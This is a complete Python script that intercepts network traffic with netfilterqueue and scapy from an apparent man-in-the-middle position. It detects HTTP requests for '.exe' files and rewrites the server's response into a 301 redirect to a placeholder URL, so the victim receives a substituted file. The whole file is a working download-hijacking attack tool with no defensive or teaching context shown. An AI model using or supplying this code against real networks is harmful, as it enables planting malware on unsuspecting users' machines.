#!/usr/bin/env python

import netfilterqueue
import scapy.all

ack_list = []

def get_load(packet, load):
    packet[scapy.all.Raw].load = load
    del packet[scapy.all.IP].len
    del packet[scapy.all.IP].chksum
    del packet[scapy.all.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.all.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.all.Raw):
        if scapy_packet[scapy.all.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.all.Raw].load):
                ack_list.append(scapy_packet[scapy.all.TCP].ack)
        if scapy_packet[scapy.all.TCP].sport == 80:
            if scapy_packet[scapy.all.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.all.TCP].seq)
                print("[+] Replacing Download")
                modified = get_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")

                packet.set_payload(bytes(modified))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()